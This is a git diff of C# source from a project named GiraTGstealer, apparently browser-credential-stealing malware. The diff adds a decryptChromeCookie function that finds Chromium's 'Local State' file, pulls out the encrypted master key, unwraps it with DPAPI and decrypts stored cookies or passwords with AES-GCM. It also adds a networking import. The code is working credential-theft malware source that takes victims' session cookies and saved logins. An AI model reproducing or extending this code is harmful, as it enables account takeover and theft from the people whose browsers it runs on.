@@ -1,7 +1,10 @@
 ﻿using System;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Text;
+using System.Threading.Tasks;
+using GiraTGstealer;
 
 namespace GiraTGstealer.stealer
 {
@@ -15,9 +18,11 @@ namespace GiraTGstealer.stealer
             if (password.StartsWith("v10") || password.StartsWith("v11"))
             {
                 // Get masterkey location
-                string masterKey, masterKeyPath = "";
+                string masterKey;
+                string masterKeyPath = "";
                 foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
                 {
+                    //Console.WriteLine(Path.GetDirectoryName(browser) + l_s + "\\Local State");
                     masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
                     if (File.Exists(masterKeyPath))
                     {
@@ -61,6 +66,57 @@ namespace GiraTGstealer.stealer
             }
         }
 
+        public static string decryptChromeCookie(string password, string browser = "")
+        {
+            // If Chromium version > 80
+            if (password.StartsWith("v10") || password.StartsWith("v11"))
+            {
+                // Get masterkey location
+                string masterKey;
+                string[] masterKeyPath = { "" };
+                masterKeyPath = Directory.GetFiles(browser, "Local State", SearchOption.AllDirectories);
+                Console.WriteLine(masterKeyPath[0]);
+                if (File.Exists(masterKeyPath[0]))
+                {
+                }
+                else
+                {
+                    masterKeyPath = null;
+                }
+
+                // Get master key
+                masterKey = File.ReadAllText(masterKeyPath[0]);
+                masterKey = SimpleJSON.JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
+                Console.WriteLine("Master key: " + masterKey);
+                // Decrypt master key
+                byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
+                byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
+                byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
+                // Decrypt password by master-key
+                try
+                {
+                    byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
+                    byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
+                    string decryptedPassword = Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));
+                    return decryptedPassword;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.ToString());
+                    return "failed (AES-GCM)";
+                }
+
+                // return decryptedPassword;
+            }
+            else
+            {
+                try
+                {
+                    return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password), null, out string _)); ;
+                }
+                catch { return "failed (DPAPI)"; }
+            }
+        }
         // Convert 1251 to UTF8
         public static string toUTF8(string text)
         {
@@ -72,6 +128,8 @@ namespace GiraTGstealer.stealer
 
             return win1251.GetString(win1251Bytes);
         }
+
+       
 
     }
 }
